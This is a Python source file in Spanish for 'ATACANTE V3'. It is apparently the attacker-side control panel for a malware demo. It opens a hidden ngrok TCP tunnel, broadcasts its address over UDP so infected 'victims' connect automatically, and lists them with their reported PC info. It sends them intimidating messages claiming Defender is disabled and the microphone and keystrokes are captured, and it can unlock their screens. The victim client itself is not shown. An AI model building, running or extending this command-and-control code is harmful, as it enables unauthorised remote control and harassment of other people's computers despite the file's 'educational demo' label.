# -*- coding: utf-8 -*-
"""
ATACANTE V3 - Auto-discovery + ngrok
Ejecutar primero. Emite broadcasts para que la victima lo encuentre solo.
"""
import socket, threading, sys, time, os, subprocess, re, json
from datetime import datetime

PUERTO_TCP = 5555
PUERTO_UDP = 5556
victimas = {}
lock = threading.Lock()
next_id = 1
ngrok_url = None

MSG_PRESET = [
    "Hola... te arrepentis de haber ejecutado ese archivo?",
    "Mira lo que hiciste. Ahora estoy dentro.",
    "Windows Defender? Desactivado.",
    "Firewall? No te sirve de nada.",
    "Tu microfono lo tengo yo ahora.",
    "Todo lo que escribis, lo veo.",
    "Esto es lo que pasa por ejecutar archivos desconocidos.",
    "No confies en todo lo que te llega.",
    "Pero... esto es solo una DEMO EDUCATIVA.",
    "Aprendiste algo? No ejecutes cualquier cosa.",
    "Para desbloquear, escribe: U en el menu",
]

def obtener_ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return ip
    except: return "127.0.0.1"

def iniciar_ngrok():
    """Intenta iniciar ngrok para tunel TCP"""
    global ngrok_url
    posibles = [
        "ngrok.exe", "ngrok",
        r"C:\Users\Usuario\AppData\Local\Microsoft\WinGet\Packages\Ngrok.Ngrok_Microsoft.Winget.Source_8wekyb3d8bbwe\ngrok.exe",
        r"C:\Users\bokul\AppData\Local\Microsoft\WinGet\Packages\Ngrok.Ngrok_Microsoft.Winget.Source_8wekyb3d8bbwe\ngrok.exe",
    ]
    ngrok_path = None
    for p in posibles:
        try:
            subprocess.run([p, "version"], capture_output=True, timeout=2)
            ngrok_path = p; break
        except: continue
    if not ngrok_path: return None
    try:
        # Iniciar ngrok en segundo plano
        proc = subprocess.Popen(
            [ngrok_path, "tcp", str(PUERTO_TCP), "--log=stdout"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        # Esperar y extraer URL
        time.sleep(3)
        # Usar la API local de ngrok
        try:
            import urllib.request
            resp = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3)
            data = json.loads(resp.read())
            tunnels = data.get("tunnels", [])
            for t in tunnels:
                if t.get("proto") == "tcp":
                    ngrok_url = t.get("public_url", "")
                    break
        except: pass
        return ngrok_url
    except: return None

def broadcast_atacante():
    """Emite broadcast UDP cada 2s para que la victima lo encuentre"""
    ip_local = obtener_ip_local()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        mensaje = f"ATACANTE_AQUI:{ip_local}:{PUERTO_TCP}"
        if ngrok_url:
            mensaje += f":{ngrok_url}"
        while True:
            try:
                sock.sendto(mensaje.encode("utf-8"), ("255.255.255.255", PUERTO_UDP))
                sock.sendto(mensaje.encode("utf-8"), ("192.168.163.255", PUERTO_UDP))
                sock.sendto(mensaje.encode("utf-8"), ("192.168.1.255", PUERTO_UDP))
            except: pass
            time.sleep(2)
    except: pass

def limpiar():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    limpiar()
    ip = obtener_ip_local()
    print(f"\033[91m  {'='*55}")
    print(f"  ATACANTE V3 - PANEL DE CONTROL")
    print(f"  Escuchando en: {ip}:{PUERTO_TCP}")
    if ngrok_url:
        print(f"  Ngrok: {ngrok_url}")
    print(f"  Hora: {datetime.now().strftime('%H:%M:%S')}")
    print(f"  Victimas se conectaran automaticamente")
    print(f"  {'='*55}\033[0m")

def manejar_victima(conn, addr, vid):
    ip = addr[0]
    nombre = f"Victima-{vid}"
    with lock:
        victimas[vid] = {'conn': conn, 'addr': addr, 'ip': ip, 'nombre': nombre}
    try:
        conn.settimeout(5)
        try:
            data = conn.recv(2048)
            if data:
                for linea in data.decode("utf-8").split("\n"):
                    linea = linea.strip()
                    if linea.startswith("[IP]"):
                        ip_real = linea[4:]
                        with lock: victimas[vid]['ip'] = ip_real
                    elif linea.startswith("[PCINFO]"):
                        info = linea[8:]
                        with lock: victimas[vid]['pcinfo'] = info
                        print(f"\033[93m[INFO] {nombre}: {info}\033[0m")
        except socket.timeout:
            pass
        print(f"\033[92m[+] {nombre} conectada - IP: {victimas[vid].get('ip', ip)}\033[0m")
        if 'pcinfo' in victimas[vid]:
            print(f"\033[93m    Info: {victimas[vid]['pcinfo']}\033[0m")

        conn.settimeout(None)
        while True:
            try:
                data = conn.recv(2048)
                if not data: break
                msg = data.decode("utf-8").strip()
                if msg.startswith("[PCINFO]"):
                    info = msg[8:]
                    with lock: victimas[vid]['pcinfo'] = info
                    print(f"\033[93m[INFO] {nombre}: {info}\033[0m")
            except: break
    except: pass
    finally:
        with lock:
            if vid in victimas: del victimas[vid]
        try: conn.close()
        except: pass
        print(f"\033[91m[-] {nombre} desconectada\033[0m")

def listar():
    with lock:
        if not victimas:
            print("\033[93m[!] No hay victimas conectadas\033[0m"); return None
        print("\n\033[96m=== VICTIMAS CONECTADAS ===\033[0m")
        for vid, info in victimas.items():
            ip = info.get('ip', '?')
            pc = info.get('pcinfo', '')
            print(f"  [\033[92m{vid}\033[0m] {info['nombre']} - {ip}")
            if pc: print(f"       {pc}")
        return list(victimas.keys())

def enviar(vid, msg):
    with lock:
        if vid not in victimas: print("[-] No encontrada"); return False
        conn = victimas[vid]['conn']
    try:
        conn.send(msg.encode("utf-8"))
        print(f"\033[94m[>] Enviado a Victima-{vid}: {msg}\033[0m")
        return True
    except:
        print(f"\033[91m[-] Error enviando\033[0m"); return False

def menu_victima(vid):
    while True:
        print(f"\n\033[96m>> Victima-{vid} <<\033[0m")
        for i, m in enumerate(MSG_PRESET, 1):
            print(f"  [{i}] {m}")
        print("  [M] Mensaje propio")
        print("  [U] Desbloquear (UNLOCK)")
        print("  [B] Volver")
        cmd = input("\033[95m>> \033[0m").strip()
        if cmd.lower() == "b": break
        elif cmd.lower() == "u": enviar(vid, "[UNLOCK]"); break
        elif cmd.lower() == "m":
            msg = input("Mensaje: ").strip()
            if msg: enviar(vid, msg)
        else:
            try:
                idx = int(cmd)-1
                if 0 <= idx < len(MSG_PRESET): enviar(vid, MSG_PRESET[idx])
                else: print("[!] Numero invalido")
            except: print("[!] Comando invalido")

def menu_principal():
    while True:
        print("\n\033[96m=== MENU ===\033[0m")
        print("  [L] Listar victimas")
        print("  [S] Seleccionar victima")
        print("  [N] ngrok status")
        print("  [Q] Salir")
        cmd = input("\033[95m>> \033[0m").strip().lower()
        if cmd == "q": break
        elif cmd == "l": listar()
        elif cmd == "n":
            if ngrok_url: print(f"\nngrok URL: {ngrok_url}")
            else: print("\nngrok no activo")
        elif cmd == "s":
            ids = listar()
            if ids:
                try:
                    v = int(input(f"ID: "))
                    if v in victimas: menu_victima(v)
                    else: print("[!] ID invalido")
                except: print("[!] Numero invalido")

def main():
    global ngrok_url
    # Intentar ngrok en segundo plano
    threading.Thread(target=lambda: setattr(sys.modules[__name__], 'ngrok_url', iniciar_ngrok()), daemon=True).start()
    time.sleep(0.5)
    banner()
    # Servidor TCP
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", PUERTO_TCP))
        server.listen(10)
    except Exception as e:
        print(f"\033[91m[!] Error: {e}\n    Ejecuta como admin o cambia puerto\033[0m")
        sys.exit(1)
    # Broadcast thread
    threading.Thread(target=broadcast_atacante, daemon=True).start()
    # Aceptar conexiones
    def aceptar():
        while True:
            try:
                conn, addr = server.accept()
                global next_id
                vid = next_id; next_id += 1
                threading.Thread(target=manejar_victima, args=(conn, addr, vid), daemon=True).start()
            except: break
    threading.Thread(target=aceptar, daemon=True).start()
    try: menu_principal()
    except KeyboardInterrupt: print("\n[*] Cerrando")
    finally: server.close()

if __name__ == "__main__":
    main()
